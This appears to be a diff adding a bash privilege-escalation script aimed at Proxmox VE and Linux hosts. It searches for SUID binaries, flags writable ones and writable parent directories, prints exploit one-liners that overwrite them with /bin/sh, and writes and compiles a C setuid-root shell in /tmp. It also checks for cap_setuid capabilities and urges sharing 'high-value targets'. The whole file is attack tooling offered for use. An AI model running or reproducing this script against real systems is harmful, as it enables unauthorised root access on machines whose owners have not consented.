@@ -1,0 +1,73 @@
+#!/bin/bash
+# suid-writable-hunter.sh - Detect writable SUID binaries for hijacking
+# Proxmox VE / Linux Privesc Tool
+
+echo "[+] Hunting writable SUID binaries..."
+echo "=============================================="
+
+# Find ALL SUID binaries
+SUID_BINS=$(find / \( -perm -4000 -o -perm -6000 \) -type f 2>/dev/null | xargs -r ls -la)
+
+# Check each for writability/abuse potential
+echo "$SUID_BINS" | while read line; do
+    if [[ -n "$line" ]]; then
+        bin_path=$(echo "$line" | awk '{print $NF}')
+        [[ ! -f "$bin_path" ]] && continue
+        
+        # Permissions check
+        perms=$(stat -c "%A %a" "$bin_path" 2>/dev/null)
+        owner=$(stat -c "%U" "$bin_path" 2>/dev/null)
+        size=$(stat -c "%s" "$bin_path" 2>/dev/null)
+        
+        echo "[SUID] $bin_path"
+        echo "  Owner: $owner | Perms: $perms | Size: ${size}B"
+        
+        # WRITABLE checks (CRITICAL)
+        if [[ -w "$bin_path" ]]; then
+            echo "  🔥 WRITABLE SUID! Direct overwrite possible"
+            echo "  Exploit: cp /bin/sh $bin_path; chmod 4755 $bin_path; $bin_path"
+        fi
+        
+        # Parent directory writable
+        parent_dir=$(dirname "$bin_path")
+        if [[ -w "$parent_dir" ]]; then
+            echo "  🔥 PARENT DIR WRITABLE! Can replace binary"
+            echo "  Exploit: cp /bin/sh $bin_path; $bin_path"
+        fi
+        
+        # Small binaries (< 1MB) = good hijack targets
+        if [[ "$size" -lt 1000000 ]]; then
+            echo "  💥 SMALL BINARY! Perfect for shellcode injection"
+        fi
+        
+        # Proxmox/QEMU/LXC specific
+        if [[ "$bin_path" =~ (pve|qemu|lxc|vz) ]]; then
+            echo "  🐳 PROXMOX/CONTAINER BINARY! High value target"
+        fi
+        
+        echo ""
+    fi
+done
+
+echo "[+] Checking /tmp world-writable abuse..."
+if [[ -w /tmp ]]; then
+    echo "  🔥 /tmp writable - drop SUID shell here"
+    cat > /tmp/suid-test.c << 'EOF'
+#include <unistd.h>
+#include <sys/types.h>
+int main() {
+    setuid(0); setgid(0);
+    execve("/bin/sh", NULL, NULL);
+}
+EOF
+    gcc -static -o /tmp/suid-sh /tmp/suid-test.c 2>/dev/null && echo "  💣 /tmp/suid-sh compiled - find SUID target to copy"
+fi
+
+echo "[+] Capabilities abuse check..."
+getcap -r / 2>/dev/null | grep cap_setuid
+
+echo "[+] Proxmox specific SUID hunt..."
+find /usr/bin /usr/sbin /var/lib/pve -perm -4000 2>/dev/null 2>&1 | xargs -r ls -la
+
+echo "=============================================="
+echo "[+] Copy output to note and share high-value targets!"
